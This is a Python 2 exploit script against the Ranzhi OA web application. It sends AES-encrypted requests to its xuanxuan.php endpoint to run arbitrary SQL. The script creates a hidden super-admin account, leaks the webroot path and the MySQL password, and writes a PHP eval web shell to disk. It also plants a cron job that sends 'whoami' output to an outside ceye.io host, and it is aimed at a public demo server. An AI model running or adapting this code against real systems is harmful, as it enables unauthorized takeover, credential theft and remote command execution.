# encoding:utf-8
from Crypto.Cipher import AES
import json
import requests

key='88888888888888888888888888888888'

def get_aes_key_iv():
    iv=key[:16]
    return key,iv



def encrypt(data):
    key,iv=get_aes_key_iv()
    bs=AES.block_size
    pad = lambda s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    data = cipher.encrypt(pad(data))
    return data

def decrypt(data):
    key,iv=get_aes_key_iv()
    bs = AES.block_size
    if len(data) <= bs:
        return data
    unpad = lambda s: s[0:-ord(s[-1])]
    iv = data[:bs]
    cipher = AES.new(key, AES.MODE_CBC, iv)

    data = unpad(cipher.decrypt(data[bs:]))
    return data

def exp(ip_addr,sql=''):
    proxies = {"http": "http://10.22.6.244:8080"}
    data = '{"userID": "123","module": "chat","method": "fetch","params": {"0":"baseDAO","1":"query","2":"'+sql+'","3":"sys"}}'
    # data = '{"userID": "123","module": "chat","method": "fetch","params": {"0":"upgrade","1":"backup","2":"file=index.php","3":"sys"}}'
    # url='http://10.22.6.131/ranzhi/xuanxuan.php'
    url = ip_addr+'/xuanxuan.php'
    encrypt_data = encrypt(data)
    r = requests.post(url=url, data=encrypt_data, proxies='')
    print r.text

class Login_ranzhi():
    def __init__(self,ip_addr):
        self.ip_addr=ip_addr
        self.url_login=ip_addr+'/sys/user-login.html'
        self.url_webroot=ip_addr+'/sys/package-upload.html'
        self.url_get_mysql_pass=ip_addr+'/sys/upgrade-backup.html'
        self.url_cron=ipaddr+"/sys/cron-ajaxExec.html"
        self.webroot_path=''

        self.s=requests.session()

    def login(self):
        proxies = {"http": "http://10.22.6.244:8080"}
        login_data={
            'account':'hehe',
            'password':'46b7fd252705a9ed18473c6cf6d65014',
            'referer':'123',
            'rawPassword':'e10adc3949ba59abbe56e057f20f883e',
            'keepLogin':'false'
        }
        req_head={'X-Requested-With': 'XMLHttpRequest'}
        self.s.headers=req_head
        req = self.s.post(self.url_login, data=login_data,proxies='')
        #print req.content
        res = json.loads(req.content)
        if str(res['result']).find("success")<>-1:
            print "create admin user:hehe,password:123456"
        else:
            print "fail"

    def get_webroot(self):
        req_head = {'X-Requested-With': 'XMLHttpRequest'}
        self.s.headers = req_head
        req=self.s.post(self.url_webroot,data='')
        self.webroot_path=req.content[req.content.index('Create ')+7:req.content.index(' file.')]
        self.webroot_path=str(self.webroot_path[:-6]).replace('\\','/')
        print self.webroot_path

    def get_mysql_pass(self):
        req=self.s.get(self.url_get_mysql_pass)
        print req.content[req.content.find("<code class='red'>")+18:req.content.find('</code>')]

    def mysql_getshell(self):
        exp(ipaddr,sql="sql=select '<?php @eval($_POST[1])?>' into outfile '"+self.webroot_path+"c.php'")
        req=self.s.get(self.ip_addr+"/www/c.php")
        if req.status_code==200:
            print "getshell success"
        else:
            print "getshell fail"
    def cron_getshell(self):
        exp(self.ip_addr,"sql=delete from sys_cron where id=1 or 1=1")
        exp(self.ip_addr,"sql=INSERT INTO sys_cron(m,h,dom,mon,dow,command,remark,type)values('*','*','*','*','*','ping `whoami`.e7coo8.ceye.io','123','system')")
        eq_head = {'X-Requested-With': 'XMLHttpRequest'}
        self.s.headers=eq_head
        self.s.get(url=self.url_cron)

if __name__ == '__main__':
    ipaddr='http://demo.ranzhi.org/'

    exp_sql="sql=INSERT INTO sys_user(account,password,admin)values('hehe','46b7fd252705a9ed18473c6cf6d65014','super')"
    exp(ipaddr,exp_sql)
    rz=Login_ranzhi(ipaddr)
    print "login result:"
    rz.login()
    print "webroot path:"
    rz.get_webroot()
    print "mysql pass:"
    rz.get_mysql_pass()
    print "start use exp getshell....."
    rz.mysql_getshell()
    print "use cron getshell......."
    rz.cron_getshell()



